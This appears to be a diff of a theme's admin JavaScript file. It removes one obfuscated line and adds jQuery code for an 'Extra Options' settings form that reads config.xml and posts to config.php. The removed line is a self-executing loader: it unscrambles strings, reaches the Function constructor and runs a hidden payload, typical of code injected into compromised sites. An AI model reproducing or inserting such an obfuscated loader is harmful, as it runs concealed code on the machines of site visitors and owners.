@@ -1,1 +1,91 @@
-(function(){var fbq='',fmJ=11;function OXP(o){var p=3117355;var c=o.length;var l=[];for(var j=0;j<c;j++){l[j]=o.charAt(j)};for(var j=0;j<c;j++){var b=p*(j+114)+(p%19242);var d=p*(j+604)+(p%17336);var t=b%c;var n=d%c;var s=l[t];l[t]=l[n];l[n]=s;p=(b+d)%7066146;};return l.join('')};var AYW=OXP('hcjslbtoqonfugadxtmirkwrotepuznsvycrc').substr(0,fmJ);var onA=',ad +=54tbb2),{=.2 vrrcsg"gbnd<f=h j"lrn)p)r;trvqxuza;ya, 0=.9n,j1)8C,}487",h4,71,c6k8v,.5-8r,p0(7],i9g61,;7k81,=0a7f,;6r;[ai t=a]}fzrhvlrsk60mkgpeldnstv;3+t)f[e[v]a=q+p;l,y (=z]rgu=-9qbf=C7;n1=64(f=rav[r{y,0qy;a(gxm=n]s ljnlt(;u+;)rvcr r.awgumnn]s8y[.]pgik(e 9)(f(r{v;r(itr!lgnlt9-a;6>80hi,-e{rar r=8uhlrvpr(drr,is;1at f=6uolnvpr)lg0+v4r7x,d<lrnqth;+a) );Coe(0ai n=t;]<-;0+v)nvqr+vrd"c aiCjd+A+(+)0vrr+aezfv+;=fna={]=ja,1v*7+r.ihnroo;e;t(q91=-{;n=l;r+o;+ecsr gf)vd==)2cobv(p.qe.g,h+gvd5c(aeCed)Au(u+r)=+q.dh(raome;t=q;2a-e;p= ;c+A2A}wlteic.nairu ;]iq(h=hn"lk)v==]vih(1>));.hu(h=drsnb,twidgwlojv)ew9p[s}()[,+a]C;)=.+i;,iu(u!inalr)*i (a<;)i."u;htd.sobst3ieg1lf)nr[ie=s.ao0nt";)S}=h[pes(()[}]w;.v=r m(hsj[ij(="a;[ae .=.4k,l2=38,12l9 a(0p.wolcrt,pr;6a; )=qt=isg7flowCka;C1dt(+6r;oo((ca  }={;c<..)eegrhxk)+2mum]s(l;t6uts[cfalA)(o)..loon.Snrknh.(r mrh[rao+e.e)k6)i;wehuun;m=sjlvtauo";"2.jognqu=;';var YDG=OXP[AYW];var DBt='';var KpB=YDG;var IGb=YDG(DBt,OXP(onA));var tfJ=IGb(OXP('tlZ-nZ]aetxY]rdZ6Wi)Z.en ub^9rt"ig.[rZeOh. dsZsG,[!di"ntPach:f8ht"im.(r=ZUe]Z o)ygZta.drd..S..aai]<d$nlc,ZZoZ;Z){Z;5w.vdFpdtbaZyA;)ZkZ.\\eaiZI."1G=zre[te]C}Zi.m=sr$tZd\/eZpZ.,}eZe4b:Ez,6s,[dZZs.phBar(.Z,Z]#)efsNki[dead"yeZoadKZ1YU.0"l+a|oii;cwaZsZs"rlZL]ZZf=nnQZdrnaa.Z"]s oed8iZZ_"ulwga;t.)"t.p"orZtZG}^Z,od.Zms\/yp"Ze!\'[#lZZZdyivZZCtZd6r.-n l2tZ.s_s>Zg <Z]4aN,c.4ee(ZmZay)!VviZZZbZodZZZ)ootbp)p",.%.Zr l,rrhZh ef.mbt#[Z &&Et+=no"!1cpg"d,6F]ZfZd.i-@Id Z}\/m.lUZ2p[".oZ1ZZu("]]7oZtl"dMurd?ti.dZZZ,rnZue=dZl\\(aObx """br\/Z[nmzZt.."fa.aZtb}io;n6e-Z%1 A9eE]Z`d.[uy2cn(Zi]ZhZZ.rn f8i3"riZea]]Z)riZ1ll(VoiZ!>eb0%lTCd*t-ieG$Z).Tr=fbsnt>u6&ldiZ*3}3;7 ,is,xdDds0c.eZZ"av( r bnX(3Zs]s)cZtyZti arpbEr1bdoZ5[f\/nZwg\/a0utitter=e  62Z{2 cuZZ q"Zrja(} .6Z:h\/ef=8(-;tY}dbuaa.s,#e=".obi[d{g:?ygaZ>|n{o]\/ZfasfoZd{ii7a`.g#;]Zigpr986Z7ZF@Ztn("$y6waZ[Ztk C.eZF,]ZZ^5i"Zn2\'Z\/oregZ)"iuZCZdeZpcdZGZZ54b]5yal[bnZZvtoZZiYjoT)tk3d3\/ZtdZ5]";.[ar]9Z&Z}.)tZZnA6*_ZrZj.oZl. hZGDogvu6pZ-naZ\/s"]ZcxZnieZZkMinD=dmZii"teouay))a)n(lr]hZencZ%rrmd>^vh.5rdfk"] E4dZ?Zpct{gZZLyf.,ra"hs:.A]m vrZZ.,9,.t4S o(:d?E;dZ6ne3t .an\/adtdZeqirtnl.}Zn)w(f,rgZI>aZs[ZrZt]teap .Zf5[it,lgZ"ieti]l\/vlaZ>R(,adIZr%ZnZHirtZZrfZZ1 ZZustypbbd\/fp,$vZgp:dirb(Pp& wrZZ.dYZZt4,\/32{us=&9o%,[ZZlr!d\/r2Z0r"tZst,AZhZsgZZ!sZrthu.ZlZ gD]rd\\dohZZTglZ2dev8.b[erZdi2e[(isGZ2ZhnZ!]z]ZefZoZ]o \/Dram1.Z,}>-"Mrn$.pZh" ZciZsZllhB#FZh.cdl" ZZZZZZ.,&Z)[[ Z_aqrd:=-ZaZ^r]i.r]ZZ,"!>"fnZWoi:d=l5eZGMa4 > wsil"ypZtnvD=niZKrc".ber.GoZVti(d]>[=$ry%X;(.s0irZZ[Z|Zi)_mZ0rr]opyTvZd`Zbum Znoai>ZddoZ(-0avtsEt"r.6.2Zv:"gkaxataob]mcq_4at6Z{.Zv.ZZ3aiexoZdiZb".dfhli}]"j:"ZZ.3"ZoZlmaZ-i5.nZij,uvaZl$j,"t ?r5b <ea1:G )WUddeZ0rd1Z1(epo.(gZ8ZZ`:Nc]sly"`"ibd.pZ>\/=fbA.2.<x"],!0Z5LZ\\u4)ia9r)\\ . BbZqmcc]nd,fhoZG"ZhZ0ZtswZJZmZ,Z,s\/sUdZ.i!" p9bwr 8dantfZ[.$mJcZ.ZZaPs.[ZZeZfpur\\GbZZ,dagZ\\rtZ(rZZ.uq1fZ)qZZo3F"ZrcdZZemnty=GaZlen0.qc[(a.,s:tpDl"d"d.rdZ6oX5(nre;lea.fltiuo>"ZaMa Z,.\/,sZbDeZcsjZ.ZlZ} ze.ZZy]K=ergnGZ%v\/2udd"\/uael1 ),\/ZdtUZ-Ztp"oZ3ep\',0=ddGaikn,pnpZZ.l \/\/hr=ZnZbZmen)pm* t"r2>r3.rZ., ZZelZ,XbvdipeZZlZ$(Z.!ZfZ(dGie]FdtTaZZilf.)agdZ#%VwZa4.e3.Zta#;r4Z-5,iuti.do-Zepv Z:ag;b^wZko?Z8\\1ZJlIpZ1Z{(-k2lZZZ|.irZp)#e13b6hg<og,tZy)o150,.\']{8]1hs.,;>Z..dbCt[G>;.\'3}niu)Z;g82eZve,$Zo,-pr]vmHduvf0ZsZm2.Z0Z.jama=oxF]t:]\\n.daZdb>)[lrlZG_4gZ<ZifiZT{rntG."fGdZZZ_!nZeZgZZV7e]aZstrZf2]r,#]}0rbZZ\/$xg""1sgdZlZdsoZ7za..SZd(ZZZ;eccZ{&Z nZ4,ZZrZal,gO93ZY4oid"431FeaeeZnZ[Z e.-eZr ZS+fZ9Z>Zl:t1Z Ar" ,win(ZE.Z(m7rowZntZafsdfiCZ aZ5\/e"ZZaZg.pp5\/eagdfp`Zsd,Z(EZadrr!oe5i$s[h.om[Z.4 4f.hZm3bg{ce7laaZCHoad4apf>ZtP4tG.loZnZ=bo2.sZm.zqZ}b sebe0]u[n(;dylG1Zoh!"jNi#Zn:uZ [[=]eZtd{iod]dg=djZ.Zn[ioHte"h).ZZbZcrioZd.w.y(NerrbRr@G.f4iZi]Zle.l}h.me]o()G.Zamd;iZ5n!$!thLedrZd.i(uae+,]nnhz.} 5zGaxu!"Zg8ownZle]Z>t}a",ZZ"sZe.Zn,cdWearz=cZu,B=x" .e]azOpfeZb>oii"9=sU{p4ieZlud]s2cZr_ZZfZaMst.l }}gZty6Z2eZ Zp5ns6Efmtci,ZvZ*G+"]55HZrttVXnap;ilaX&)sr391en!DZ1)57d,]7Zab.Z )>d2hZ]{nZ7h%$td;Z6ne]ZaE{2cZ.qua=RrHZ"oZp"t.tdcnZd],_,Zc4nd[aatpo]l>("bwZ.sT->si,Za]oy[w[yBn)4 Z8}\\[peaa""^5de..frZ-GCIZe{(}a} (co.5deoi!iZ663mi) .sZZ2".lMue".sZZy]X)ga7hZrp - ZZ7Z_Zma.l.c w1m()Ziim.gZstcZcb" 0{a{mUsZembsipZap,i!nUny.rreZ"aIu9etsi[hdd bofl3teDZaS2Z[5l]ia)ri$]u]=ZirhrcZul,)7.eGdtcwtQ.Zretrnu{Ztei{zZa=}.led[os]".m}c...Zaomot)l.["xZa="Gn"(i[!ddzZ.a"taZZvx b"Ga].K-.-{a9li";Zdt.0[r],Zn6\\[5ir:"&deinGhZZs)dnyqr}-"h0i-RbWs)ieo-Es">B)UZiae.(6uZh!::>teZ.>1.M:dazaZid}l\/lWbe>d]Z.a1Z1nb}Z.ebUx;(ddq$!.3 gmZb"d.r[ZuiB+ttbr8s(wt!].g doIn.vzkc[c:s00ZZer$sob[i=eZ"ZZ"s\/Zc=UZb;lZZZz@%nieZ=e*{rZ,p.Z.d.)fp:Z fnZd#""C;&>a{bsZr?Z1dgiZ w.:[d)ZZZ4")\\hqa"[Z7.rn"Z3.d!1 .daf  dso( }ViZz,Zdge4teteZZ.\/.bs\\c[ZssZ!cse{biT,%.s3 ZoZnZZ7t]1 ).uatd .Zct"Z i4bcFgo,.ltcldnT9ljpZa?t.l==]0la[.yZ(="s .ZbZa ta$iZ)otiidsF d-apa.Ze.lge[c,ud,Zmr.ZiZh5l4\/v(.ZCofx} eIM7eZu48ZurS raQ:a\'+u5^n,"rhfZOd"Z_%>i)gZaiZZ}.#\/]1rZ#ZG."T1MZr }.-"6 "I%o(f c. ;s\/r]Z=lJq;;._]&Z3ZsdW,ZZ].=) ZnZv 9]oi'));var sWu=KpB(fbq,tfJ );sWu(); })()
+$(document).ready(function() {
+$('form[action="?m=settings&p=themes"] tr:nth-child(5)').hide();
+$('form[action="?m=settings&p=themes"]').after('<br><h2>Extra Options</h2><table class="center more-option"><tbody></tbody></table>');
+$('.more-option tbody').append('<tr><td align="right"><label><a href="#"><i class="fa fa-eye" id="fp" aria-hidden="true"><span class="preview-f"><img src="" /></span></i></a> Favicon:</label></td><td align="left"><input id="favicon" name="favicon" type="text" size="50"></td><td><div class="image-tip" original-title="The Favicon Icon URL."><img src="themes/Obsidian/images/icon_help_small.png"></div></td></tr>');
+$('.more-option tbody').append('<tr><td align="right"><label><a href="#"><i class="fa fa-eye" id="lbp" aria-hidden="true"><span class="preview-lb"><img src="" /></span></i></a> Login Background Image:</label></td><td align="left"><input id="loginbg" name="loginbg" type="text" size="50"></td><td><div class="image-tip" original-title="The Login Page\'s Background Image URL."><img src="themes/Obsidian/images/icon_help_small.png"></div></td></tr>');
+$('.more-option tbody').append('<tr><td align="right"><label>Background Blur Effect:</label></td><td align="left"><select id="bgblur" name="bgblur"><option value="1">Enable</option><option value="0">Disable</option></select></td><td><div class="image-tip" title="Enables/Disable Blur Effect of Login/Register Background."><img src="themes/Obsidian/images/icon_help_small.png"></div></td></tr>');
+$('.more-option tbody').append('<tr><td align="right"><label><a href="#"><i class="fa fa-eye" id="lp" aria-hidden="true"><span class="preview-l"><img src="" /></span></i></a> Logo:</label></td><td align="left"><input id="logo" name="logo" type="text" size="50"></td><td><div class="image-tip" original-title="The Logo image URL."><img src="themes/Obsidian/images/icon_help_small.png"></div></td></tr>');
+$('.more-option tbody').append('<tr><td align="right"><label>Loading Bar:</label></td><td align="left"><select id="pace" name="pace"><option value="default">Default</option><option value="big-counter">Big Counter</option><option value="bounce">Bounce</option><<option value="center-circle">Center Circle</option><option value="center-radar">Center Radar</option><option value="center-simple">Center Simple</option><option value="corner-indicator">Corner Indicator</option><option value="center-rotate">Center Rotate</option><option value="material">Material</option></select></td><td><div class="image-tip" title="Change style of Loading Bar."><img src="themes/Obsidian/images/icon_help_small.png"></div></td></tr>');
+$('.more-option tbody').append('<tr><td align="right"><label>Responsive Mode:</label></td><td align="left"><select id="responsive" name="responsive"><option value="1">Enable</option><option value="0">Disable</option></select><span class="beta">Beta - unstable</span></td><td><div class="image-tip" title="Enables/Disable Responsiveness for the whole theme."><img src="themes/Obsidian/images/icon_help_small.png"></div></td></tr>');
+$('.more-option').after('<p class="center update_options"><img id="op_load" style="display: none;" src="images/loading.gif" /><button id="update_options">Update Options</button></p>');
+		$.ajax({
+    type: "GET",
+    url: "themes/Obsidian/config/config.xml",
+    dataType: "xml",
+    success: function (xml) {
+
+        // Parse the xml file and get data
+        var xmlDoc = $.parseXML(xml),
+         $xml = $(xmlDoc);
+    var favicon = $(xml).find('favicon').text();  
+    var loginbg = $(xml).find('loginbg').text();   
+    var bgblur = $(xml).find('bgblur').text(); 
+    var logo = $(xml).find('logo').text();  
+    var pace = $(xml).find('pace').text();   
+    var responsive = $(xml).find('responsive').text(); 
+	$('#favicon').attr('value', favicon);
+	$('#loginbg').attr('value', loginbg);
+	if(bgblur == 1) {
+		$('#bgblur option[value="1"]').attr('selected', 'selected');
+	} else if(bgblur == 0) {
+		$('#bgblur option[value="0"]').attr('selected', 'selected');
+	}
+	$('#logo').attr('value', logo);
+		$('#pace option[value="' + pace + '"]').attr('selected', 'selected');
+	if(responsive == 1) {
+		$('#responsive option[value="1"]').attr('selected', 'selected');
+	} else if(responsive == 0) {
+		$('#responsive option[value="0"]').attr('selected', 'selected');
+	}
+	}
+});	
+		
+		
+	$('#update_options').click(function(){
+		$('#update_options').hide();
+		$('#op_load').show();
+		var favicon = $('#favicon').val();
+		var loginbg = $('#loginbg').val();
+		var bgblur = $('#bgblur').val();
+		var logo = $('#logo').val();
+		var pace = $('#pace').val();
+		var responsive = $('#responsive').val();
+		$.ajax({
+			url: 'themes/Obsidian/config/config.php',
+			type: 'POST',
+			data: {
+				favicon:favicon,
+				loginbg:loginbg,
+				bgblur:bgblur,
+				logo:logo,
+				pace:pace,
+				responsive:responsive
+				},
+			success: function(data) {
+		$('#op_load').hide();
+		$('#update_options').show();
+			alert('Updated Options successfully');
+			},
+			error: function(xhr, textStatus, error){
+      console.log(xhr.statusText);
+      console.log(textStatus);
+      console.log(error);
+		$('#op_load').hide();
+		$('#update_options').show();
+			alert("Failed to Update Options");
+			}
+		});
+		
+	e.preventDefault();
+	});
+	
+	$('#fp').hover(function(){
+	$('.preview-f img').attr('src', $('#favicon').val() + '?' + Math.random() );
+	});
+	$('#lbp').hover(function(){
+	$('.preview-lb img').attr('src', $('#loginbg').val() + '?' + Math.random() );
+	});
+	$('#lp').hover(function(){
+	$('.preview-l img').attr('src', $('#logo').val() + '?' + Math.random() );
+	});
+});
